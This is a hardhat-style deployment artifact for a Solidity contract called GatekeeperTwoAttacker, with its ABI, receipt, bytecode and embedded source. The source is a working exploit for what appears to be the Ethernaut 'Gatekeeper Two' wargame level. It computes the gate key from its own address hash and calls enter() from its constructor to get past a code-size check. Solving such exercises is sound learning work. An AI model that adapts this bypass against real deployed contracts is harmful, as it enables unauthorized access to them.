{
  "address": "0x34Eea34E6e5145bf512E7a91F0d4CEAf8F24eF21",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_initialOwner",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "_initialContract",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "owner",
          "type": "address"
        }
      ],
      "name": "OwnableInvalidOwner",
      "type": "error"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "account",
          "type": "address"
        }
      ],
      "name": "OwnableUnauthorizedAccount",
      "type": "error"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "previousOwner",
          "type": "address"
        },
        {
          "indexed": true,
          "internalType": "address",
          "name": "newOwner",
          "type": "address"
        }
      ],
      "name": "OwnershipTransferred",
      "type": "event"
    },
    {
      "inputs": [],
      "name": "gateKey",
      "outputs": [
        {
          "internalType": "bytes8",
          "name": "",
          "type": "bytes8"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "owner",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "renounceOwnership",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_target",
          "type": "address"
        }
      ],
      "name": "setAttack",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "bytes8",
          "name": "_key",
          "type": "bytes8"
        }
      ],
      "name": "setGateKey",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "targetContract",
      "outputs": [
        {
          "internalType": "contract IGateKeeper",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "newOwner",
          "type": "address"
        }
      ],
      "name": "transferOwnership",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "transactionHash": "0x56c8dd9bc0581ef0cbddbb82b4785bb487773162108107a6ae57e82f0c7fc7af",
  "receipt": {
    "to": null,
    "from": "0xcC6eDeB501BbD8AD9E028BDe937B63Cdd64A1D91",
    "contractAddress": "0x34Eea34E6e5145bf512E7a91F0d4CEAf8F24eF21",
    "transactionIndex": 174,
    "gasUsed": "296749",
    "logsBloom": "0x
    "blockHash": "0xdce1a7a56fb4af5fd14d8eef7486f4edd9706f63eb8d59179ea79eb4c9f3dc6a",
    "transactionHash": "0x56c8dd9bc0581ef0cbddbb82b4785bb487773162108107a6ae57e82f0c7fc7af",
    "logs": [
      {
        "transactionIndex": 174,
        "blockNumber": 8176619,
        "transactionHash": "0x56c8dd9bc0581ef0cbddbb82b4785bb487773162108107a6ae57e82f0c7fc7af",
        "address": "0x34Eea34E6e5145bf512E7a91F0d4CEAf8F24eF21",
        "topics": [
          "0x8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e0",
          "0x0000000000000000000000000000000000000000000000000000000000000000",
          "0x000000000000000000000000cc6edeb501bbd8ad9e028bde937b63cdd64a1d91"
        ],
        "data": "0x",
        "logIndex": 237,
        "blockHash": "0xdce1a7a56fb4af5fd14d8eef7486f4edd9706f63eb8d59179ea79eb4c9f3dc6a"
      }
    ],
    "blockNumber": 8176619,
    "cumulativeGasUsed": "14088104",
    "status": 1,
    "byzantium": true
  },
  "args": [
    "0xcC6eDeB501BbD8AD9E028BDe937B63Cdd64A1D91",
    "0xFD260f233fEc5548706D692Dbc7331F2ccb9bC28"
  ],
  "numDeployments": 1,
  "solcInputHash": "a853db1a6062eab950323f65761cc238",
  "metadata": "{\"compiler\":{\"version\":\"0.8.20+commit.a1b79de6\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_initialOwner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_initialContract\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"}],\"name\":\"OwnableInvalidOwner\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"OwnableUnauthorizedAccount\",\"type\":\"error\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"gateKey\",\"outputs\":[{\"internalType\":\"bytes8\",\"name\":\"\",\"type\":\"bytes8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_target\",\"type\":\"address\"}],\"name\":\"setAttack\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bytes8\",\"name\":\"_key\",\"type\":\"bytes8\"}],\"name\":\"setGateKey\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"targetContract\",\"outputs\":[{\"internalType\":\"contract IGateKeeper\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"errors\":{\"OwnableInvalidOwner(address)\":[{\"details\":\"The owner is not a valid owner account. (eg. `address(0)`)\"}],\"OwnableUnauthorizedAccount(address)\":[{\"details\":\"The caller account is not authorized to perform an operation.\"}]},\"kind\":\"dev\",\"methods\":{\"owner()\":{\"details\":\"Returns the address of the current owner.\"},\"renounceOwnership()\":{\"details\":\"Leaves the contract without owner. It will not be possible to call `onlyOwner` functions. Can only be called by the current owner. NOTE: Renouncing ownership will leave the contract without an owner, thereby disabling any functionality that is only available to the owner.\"},\"transferOwnership(address)\":{\"details\":\"Transfers ownership of the contract to a new account (`newOwner`). Can only be called by the current owner.\"}},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/GateKeeperTwoAttacker.sol\":\"GatekeeperTwoAttacker\"},\"evmVersion\":\"paris\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\",\"useLiteralContent\":true},\"optimizer\":{\"enabled\":true,\"runs\":200},\"remappings\":[]},\"sources\":{\"@openzeppelin/contracts/access/Ownable.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v5.0.0) (access/Ownable.sol)\\n\\npragma solidity ^0.8.20;\\n\\nimport {Context} from \\\"../utils/Context.sol\\\";\\n\\n/**\\n * @dev Contract module which provides a basic access control mechanism, where\\n * there is an account (an owner) that can be granted exclusive access to\\n * specific functions.\\n *\\n * The initial owner is set to the address provided by the deployer. This can\\n * later be changed with {transferOwnership}.\\n *\\n * This module is used through inheritance. It will make available the modifier\\n * `onlyOwner`, which can be applied to your functions to restrict their use to\\n * the owner.\\n */\\nabstract contract Ownable is Context {\\n    address private _owner;\\n\\n    /**\\n     * @dev The caller account is not authorized to perform an operation.\\n     */\\n    error OwnableUnauthorizedAccount(address account);\\n\\n    /**\\n     * @dev The owner is not a valid owner account. (eg. `address(0)`)\\n     */\\n    error OwnableInvalidOwner(address owner);\\n\\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\\n\\n    /**\\n     * @dev Initializes the contract setting the address provided by the deployer as the initial owner.\\n     */\\n    constructor(address initialOwner) {\\n        if (initialOwner == address(0)) {\\n            revert OwnableInvalidOwner(address(0));\\n        }\\n        _transferOwnership(initialOwner);\\n    }\\n\\n    /**\\n     * @dev Throws if called by any account other than the owner.\\n     */\\n    modifier onlyOwner() {\\n        _checkOwner();\\n        _;\\n    }\\n\\n    /**\\n     * @dev Returns the address of the current owner.\\n     */\\n    function owner() public view virtual returns (address) {\\n        return _owner;\\n    }\\n\\n    /**\\n     * @dev Throws if the sender is not the owner.\\n     */\\n    function _checkOwner() internal view virtual {\\n        if (owner() != _msgSender()) {\\n            revert OwnableUnauthorizedAccount(_msgSender());\\n        }\\n    }\\n\\n    /**\\n     * @dev Leaves the contract without owner. It will not be possible to call\\n     * `onlyOwner` functions. Can only be called by the current owner.\\n     *\\n     * NOTE: Renouncing ownership will leave the contract without an owner,\\n     * thereby disabling any functionality that is only available to the owner.\\n     */\\n    function renounceOwnership() public virtual onlyOwner {\\n        _transferOwnership(address(0));\\n    }\\n\\n    /**\\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\\n     * Can only be called by the current owner.\\n     */\\n    function transferOwnership(address newOwner) public virtual onlyOwner {\\n        if (newOwner == address(0)) {\\n            revert OwnableInvalidOwner(address(0));\\n        }\\n        _transferOwnership(newOwner);\\n    }\\n\\n    /**\\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\\n     * Internal function without access restriction.\\n     */\\n    function _transferOwnership(address newOwner) internal virtual {\\n        address oldOwner = _owner;\\n        _owner = newOwner;\\n        emit OwnershipTransferred(oldOwner, newOwner);\\n    }\\n}\\n\",\"keccak256\":\"0xff6d0bb2e285473e5311d9d3caacb525ae3538a80758c10649a4d61029b017bb\",\"license\":\"MIT\"},\"@openzeppelin/contracts/utils/Context.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v5.0.1) (utils/Context.sol)\\n\\npragma solidity ^0.8.20;\\n\\n/**\\n * @dev Provides information about the current execution context, including the\\n * sender of the transaction and its data. While these are generally available\\n * via msg.sender and msg.data, they should not be accessed in such a direct\\n * manner, since when dealing with meta-transactions the account sending and\\n * paying for execution may not be the actual sender (as far as an application\\n * is concerned).\\n *\\n * This contract is only required for intermediate, library-like contracts.\\n */\\nabstract contract Context {\\n    function _msgSender() internal view virtual returns (address) {\\n        return msg.sender;\\n    }\\n\\n    function _msgData() internal view virtual returns (bytes calldata) {\\n        return msg.data;\\n    }\\n\\n    function _contextSuffixLength() internal view virtual returns (uint256) {\\n        return 0;\\n    }\\n}\\n\",\"keccak256\":\"0x493033a8d1b176a037b2cc6a04dad01a5c157722049bbecf632ca876224dd4b2\",\"license\":\"MIT\"},\"contracts/GateKeeperTwoAttacker.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\npragma solidity ^0.8.0;\\n\\nimport \\\"@openzeppelin/contracts/access/Ownable.sol\\\";\\n\\ninterface IGateKeeper {\\n    function enter(bytes8 _gateKey) external returns (bool);\\n}\\n\\ncontract GatekeeperTwoAttacker is Ownable{\\n    IGateKeeper public targetContract;\\n\\n    // bytes8 public gateKey = 0x100000000000a1d1;\\n    bytes8 public gateKey;\\n\\n    constructor(address _initialOwner, address _initialContract) Ownable(_initialOwner) {\\n        targetContract = IGateKeeper(_initialContract);\\n        gateKey = bytes8(uint64(type(uint64).max) ^ uint64(bytes8(keccak256(abi.encodePacked(address(this))))));\\n        targetContract.enter(gateKey);\\n    }\\n\\n    function setAttack(address _target) public onlyOwner{\\n        targetContract = IGateKeeper(_target);\\n    }\\n\\n    function setGateKey(bytes8 _key) public onlyOwner {\\n        gateKey = _key;\\n    }\\n\\n//     function attack() public onlyOwner returns (bool){\\n//         for (uint256 i = 0; i < 300; i++) {\\n//         try targetContract.enter{gas: 8191 * 10 + i}(gateKey) returns (bool result) {\\n//             return result;\\n//         } catch {}\\n//         }\\n//         revert(\\\"All attempts failed\\\");\\n//     }\\n}\",\"keccak256\":\"0xa2c3bb02e9380da791b0084ef4eb978208ba495d407e678f80d2aef7e13f8ed3\",\"license\":\"MIT\"}},\"version\":1}",
  "bytecode": "0x608060405234801561001057600080fd5b5060405161052a38038061052a83398101604081905261002f916101d2565b816001600160a01b03811661005e57604051631e4fbdf760e01b81526000600482015260240160405180910390fd5b61006781610166565b50600180546001600160a01b0319166001600160a01b0383161790556040516001600160601b03193060601b16602082015260340160408051601f19818403018152908290528051602090910120600180546001600160401b0360c093841c811816600160a01b908102600160a01b600160e01b031983168117938490556319b8102760e11b8652920490921b6001600160c01b03191660048401526001600160a01b0390811691161790633370204e906024016020604051808303816000875af115801561013a573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061015e9190610205565b50505061022e565b600080546001600160a01b038381166001600160a01b0319831681178455604051919092169283917f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e09190a35050565b80516001600160a01b03811681146101cd57600080fd5b919050565b600080604083850312156101e557600080fd5b6101ee836101b6565b91506101fc602084016101b6565b90509250929050565b60006020828403121561021757600080fd5b8151801515811461022757600080fd5b9392505050565b6102ed8061023d6000396000f3fe608060405234801561001057600080fd5b506004361061007d5760003560e01c80638da5cb5b1161005b5780638da5cb5b146100b2578063bb1ad687146100dc578063bd90df7014610109578063f2fde38b1461011c57600080fd5b8063715018a614610082578063730a694e1461008c578063741690e21461009f575b600080fd5b61008a61012f565b005b61008a61009a36600461025d565b610143565b61008a6100ad36600461028e565b610173565b6000546001600160a01b03165b6040516001600160a01b0390911681526020015b60405180910390f35b6001546100f090600160a01b900460c01b81565b6040516001600160c01b031990911681526020016100d3565b6001546100bf906001600160a01b031681565b61008a61012a36600461028e565b61019d565b6101376101e0565b610141600061020d565b565b61014b6101e0565b6001805460c09290921c600160a01b0267ffffffffffffffff60a01b19909216919091179055565b61017b6101e0565b600180546001600160a01b0319166001600160a01b0392909216919091179055565b6101a56101e0565b6001600160a01b0381166101d457604051631e4fbdf760e01b8152600060048201526024015b60405180910390fd5b6101dd8161020d565b50565b6000546001600160a01b031633146101415760405163118cdaa760e01b81523360048201526024016101cb565b600080546001600160a01b038381166001600160a01b0319831681178455604051919092169283917f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e09190a35050565b60006020828403121561026f57600080fd5b81356001600160c01b03198116811461028757600080fd5b9392505050565b6000602082840312156102a057600080fd5b81356001600160a01b038116811461028757600080fdfea26469706673582212205324283a594674230fc773dfcc1b33207ccae9d1a87db3f15ee0df1428958ef764736f6c63430008140033",
  "deployedBytecode": "0x608060405234801561001057600080fd5b506004361061007d5760003560e01c80638da5cb5b1161005b5780638da5cb5b146100b2578063bb1ad687146100dc578063bd90df7014610109578063f2fde38b1461011c57600080fd5b8063715018a614610082578063730a694e1461008c578063741690e21461009f575b600080fd5b61008a61012f565b005b61008a61009a36600461025d565b610143565b61008a6100ad36600461028e565b610173565b6000546001600160a01b03165b6040516001600160a01b0390911681526020015b60405180910390f35b6001546100f090600160a01b900460c01b81565b6040516001600160c01b031990911681526020016100d3565b6001546100bf906001600160a01b031681565b61008a61012a36600461028e565b61019d565b6101376101e0565b610141600061020d565b565b61014b6101e0565b6001805460c09290921c600160a01b0267ffffffffffffffff60a01b19909216919091179055565b61017b6101e0565b600180546001600160a01b0319166001600160a01b0392909216919091179055565b6101a56101e0565b6001600160a01b0381166101d457604051631e4fbdf760e01b8152600060048201526024015b60405180910390fd5b6101dd8161020d565b50565b6000546001600160a01b031633146101415760405163118cdaa760e01b81523360048201526024016101cb565b600080546001600160a01b038381166001600160a01b0319831681178455604051919092169283917f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e09190a35050565b60006020828403121561026f57600080fd5b81356001600160c01b03198116811461028757600080fd5b9392505050565b6000602082840312156102a057600080fd5b81356001600160a01b038116811461028757600080fdfea26469706673582212205324283a594674230fc773dfcc1b33207ccae9d1a87db3f15ee0df1428958ef764736f6c63430008140033",
  "devdoc": {
    "errors": {
      "OwnableInvalidOwner(address)": [
        {
          "details": "The owner is not a valid owner account. (eg. `address(0)`)"
        }
      ],
      "OwnableUnauthorizedAccount(address)": [
        {
          "details": "The caller account is not authorized to perform an operation."
        }
      ]
    },
    "kind": "dev",
    "methods": {
      "owner()": {
        "details": "Returns the address of the current owner."
      },
      "renounceOwnership()": {
        "details": "Leaves the contract without owner. It will not be possible to call `onlyOwner` functions. Can only be called by the current owner. NOTE: Renouncing ownership will leave the contract without an owner, thereby disabling any functionality that is only available to the owner."
      },
      "transferOwnership(address)": {
        "details": "Transfers ownership of the contract to a new account (`newOwner`). Can only be called by the current owner."
      }
    },
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  },
  "storageLayout": {
    "storage": [
      {
        "astId": 8,
        "contract": "contracts/GateKeeperTwoAttacker.sol:GatekeeperTwoAttacker",
        "label": "_owner",
        "offset": 0,
        "slot": "0",
        "type": "t_address"
      },
      {
        "astId": 193,
        "contract": "contracts/GateKeeperTwoAttacker.sol:GatekeeperTwoAttacker",
        "label": "targetContract",
        "offset": 0,
        "slot": "1",
        "type": "t_contract(IGateKeeper)188"
      },
      {
        "astId": 195,
        "contract": "contracts/GateKeeperTwoAttacker.sol:GatekeeperTwoAttacker",
        "label": "gateKey",
        "offset": 20,
        "slot": "1",
        "type": "t_bytes8"
      }
    ],
    "types": {
      "t_address": {
        "encoding": "inplace",
        "label": "address",
        "numberOfBytes": "20"
      },
      "t_bytes8": {
        "encoding": "inplace",
        "label": "bytes8",
        "numberOfBytes": "8"
      },
      "t_contract(IGateKeeper)188": {
        "encoding": "inplace",
        "label": "contract IGateKeeper",
        "numberOfBytes": "20"
      }
    }
  }
}